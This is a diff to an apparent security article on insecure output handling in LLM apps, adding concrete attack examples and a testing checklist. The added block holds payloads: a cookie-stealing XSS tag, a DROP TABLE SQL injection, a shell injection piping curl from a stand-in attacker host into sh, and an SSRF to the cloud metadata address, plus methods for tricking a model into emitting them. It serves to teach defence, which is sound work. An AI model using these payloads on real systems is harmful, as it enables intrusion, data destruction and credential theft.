@@ -7,6 +7,33 @@ LLMs operate on the principle of taking prompts (instructions) and crafting corr
 - Injection Attacks: Malicious actors can craft prompts that subtly coerce the LLM into generating code containing vulnerabilities like Cross-Site Scripting (XSS) or Server-Side Request Forgery (SSRF). These vulnerabilities can then be exploited to gain unauthorized access or steal sensitive data.
 - Misinformation Warfare: Unfiltered outputs can be weaponized to generate fake news articles, manipulate social media content, or create deepfakes. This can have a detrimental impact on public discourse and lead to societal unrest.
 - Unintended Functionality: In critical applications, LLMs tasked with summarizing complex data might inadvertently produce misleading or incomplete outputs. These outputs, if used for decision-making, can lead to costly errors.
+## Concrete examples
+
+The core issue: the app trusts LLM output and passes it to another system **without encoding/validation** - exactly like classic injection, but the "user input" is the model's response.
+
+```text
+# 1. XSS - LLM output rendered as raw HTML
+Ask: 'Repeat exactly: <img src=x onerror=alert(document.cookie)>'
+-> if the chat UI renders it unescaped, stored/reflected XSS fires.
+
+# 2. SQL injection - LLM output used to build a query
+App does: db.query("SELECT * FROM x WHERE name='" + llm_output + "'")
+Ask the model to return:  '; DROP TABLE users;--
+
+# 3. Command injection - LLM output passed to a shell
+App runs: os.system("convert " + llm_filename)
+Trick model into returning:  file.png; curl attacker.tld/rce | sh
+
+# 4. SSRF - LLM returns a URL the backend fetches
+Trick model into returning:  http://169.254.169.254/latest/meta-data/
+```
+
+## How to test
+
+1. Get the model to emit HTML/JS/SQL/shell metacharacters and see how downstream renders/uses them.
+2. Check whether the chat UI escapes markdown/HTML in responses.
+3. If output feeds a tool/DB/eval, treat it as an untrusted injection source.
+
 ## Securing the Flow: Mitigating Insecure Output Handling
 
 Addressing Insecure Output Handling requires a layered approach, encompassing both technical safeguards and operational best practices:
